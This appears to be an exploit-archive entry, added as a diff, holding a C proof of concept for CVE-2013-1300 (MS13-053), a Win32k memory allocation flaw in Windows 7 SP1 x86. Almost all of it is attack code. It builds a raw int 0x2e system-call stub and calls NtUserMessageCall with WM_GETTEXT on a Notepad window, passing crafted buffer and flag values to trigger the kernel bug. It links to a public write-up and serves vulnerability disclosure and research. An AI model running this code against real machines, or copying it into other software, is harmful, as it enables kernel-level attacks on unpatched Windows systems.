@@ -1,0 +1,41 @@
+id: 21226
+date: 09/12/2013
+title: MS13-053 Win32k Memory Allocation Vulnerability
+author: 0xbigban
+cves: CVE-2013-1300
+
+/*
+	more detials:
+	https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up-kernel-exploit/
+	this poc is written by 0xBigBan
+*/
+#include <windows.h>
+ 
+#define __NtUserMessageCall 0x11ea //on win7 sp1 x86
+
+void SystemCall(DWORD ApiNumber, ...) {
+	__asm{
+		lea edx, [ebp+0x0c]
+		mov eax, ApiNumber
+		int 0x2e
+		leave
+		ret
+	}
+}
+ 
+int main() {
+	//you should have open a txt file with notepad
+	HWND handle = FindWindow(NULL,"a.txt - notepad");
+	void* ptr = malloc(sizeof(int)*2);
+	
+	SystemCall(__NtUserMessageCall,
+				handle,
+				WM_GETTEXT,
+				0x8,	//buffer size
+				ptr,	//user mode buffer
+				0x0,
+				0x2b3,
+				0x2);	//ASCII boolean/flag
+}
+
+#  0day.today [2023-03-22]  #
